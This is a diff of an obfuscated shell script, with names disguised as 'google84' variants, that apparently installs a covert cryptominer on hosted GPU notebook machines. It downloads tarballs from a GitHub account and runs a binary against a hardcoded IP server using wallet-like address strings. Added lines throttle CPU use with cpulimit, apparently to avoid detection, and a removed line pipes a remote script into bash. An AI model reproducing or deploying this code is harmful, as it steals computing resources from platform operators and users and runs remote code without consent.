@@ -8,12 +8,16 @@ google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//
 
 if [[ $google84121274 == *"failed"* ]]; then
 
-curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/google8412127474 | bash
+echo "linux84"
 
 else
 
 while true
 do
+
+google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
+
+google841212121274="http://154.127.52.52"
 
 arr[0]="4dkJEWHWMVpTFTD6pZr8111zWoRNJUmoStit56uL3Urhte98L1Lm3VBWhUCkS6MAYyyPFNSVCqbKccLTmFbiYgA6"
 arr[1]="36emHJrD7TjVnbrvJzpooocHD2vnEMZHjHMm3kk3tMpMhPgw5NfYPtZEiu6nBJjeJi21vwLAD2d5afKDRiJPeQKW"
@@ -42,23 +46,24 @@ cd /notebooks/
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/google84121274.tar.gz
 tar -xvf ./google84121274.tar.gz
 
-cd google84121274
+cd googleapps8474
 
-count=$(echo "$google84121274 - 400"|bc)
+count=$(echo "$google84121274 - 34"|bc)
 googlelinux84=$(echo "$count / 16384"|bc -l)
 linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
 googlelinux8474=${linuxgoogle84%.*}
 
-timeout 14 ./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
+pkill -f cpulimit
 
+cpulimit -e google84121274 -l 62 &> /dev/null &
 
+./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
 
 else
+
+google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
+
+google841212121274="http://154.127.52.52"
 
 chmod -R 777 ./
 
@@ -69,57 +74,16 @@ tar -xvf ./googleapps84121274.tar.gz
 
 cd googleapps84121274
 
-google8412=$(curl -s $google841212121274 | sed "s/\s+//g")
+count=$(echo "$google84121274 - 34"|bc)
+googlelinux84=$(echo "$count / 524288"|bc -l)
+linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
+googlelinux8474=${linuxgoogle84%.*}
 
-google84="26884"
+pkill -f cpulimit
 
-if (($google84 >= 16888 && $google84 <= 34884))
-then
+cpulimit -e google84121274 -l 62 &> /dev/null &
 
-timeout 14 ./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 22
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-fi
-
-if (( $google84 >= 14884 && $google84 <= 16884 ))
-then
-
-timeout 14 ./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 12
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-fi
-
-if (($google84 >= 10884 && $google84 <= 14882))
-then
-
-timeout 14 ./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 8
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-fi
-
-if (($google84 >= 5288 && $google84 <= 9184))
-then
-
-timeout 14 ./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 4
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-fi
+./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
 
 fi
 
